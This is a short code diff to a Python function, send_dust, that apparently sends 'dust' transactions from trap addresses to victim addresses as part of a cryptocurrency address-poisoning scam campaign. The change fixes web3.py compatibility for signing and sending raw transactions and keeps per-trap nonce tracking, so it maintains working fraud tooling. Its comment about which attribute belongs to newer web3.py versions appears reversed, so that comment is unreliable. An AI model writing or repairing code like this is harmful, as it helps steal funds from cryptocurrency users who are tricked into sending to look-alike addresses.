@@ -340,9 +340,15 @@ def send_dust(private_key, victim_address, campaign_id=None):
 
         signed = w3.eth.account.sign_transaction(tx, private_key)
         
+        # ─── FIX: Use rawTransaction (camelCase) for web3.py v6+ ───
+        try:
+            raw_tx = signed.rawTransaction
+        except AttributeError:
+            raw_tx = signed.raw_transaction  # fallback for older versions
+        
         # SMART EXCEPTION CATCHING: Protect the local nonce
         try:
-            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
+            tx_hash = w3.eth.send_raw_transaction(raw_tx)
             _local_nonces[trap] += 1 
         except Exception as e:
             err_msg = str(e).lower()
